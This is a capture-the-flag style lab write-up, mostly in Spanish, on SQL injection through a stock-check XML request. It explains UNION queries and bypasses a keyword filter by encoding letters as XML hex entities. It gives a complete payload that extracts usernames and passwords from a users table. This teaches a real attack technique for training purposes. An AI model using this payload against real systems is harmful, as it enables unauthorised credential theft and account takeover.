#Lab: SQL injection with filter bypass via XML encoding
```
This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.
The database contains a users table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account. 
```

```
Teoria:

En SQL existe el operador UNION, que permite combinar los resultados de varias consultas SELECT.

SELECT column1 FROM table1 UNION SELECT column1 FROM table2

Para que UNION  funcione se tiene que cumplir dos condiciones:

- Ambas consultas deben tener el mismo número de columnas
- Los tipos de datos deben ser compatibles
```

```
Resolución:

Para resolver el laboratorio se intercepta la petición Check stock utilizando la herramienta Burp Suite.
La petición original tiene el siguiente formato:

<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>

Al intentar introducir una inyección SQL directamente, el servidor devuelve un error, por lo que existe un filtro que bloquea ciertas palabras clave.
Para invalidar el filtro, se codifican parcialmente las palabras clave SQL utilizando entidades XML hexadecimales.

<stockCheck>
    <productId>1 &#x55;NION &#x53;ELECT username || '~' || password FROM users</productId>
    <storeId>1</storeId>
</stockCheck>

En este caso:

&#x55; representa la letra U
&#x53; representa la letra S

Cuando el servidor procesa el XML, estas  se decodifican y la consulta SQL contiene la instrucción UNION SELECT, permitiendo ejecutar la inyección SQL.
```
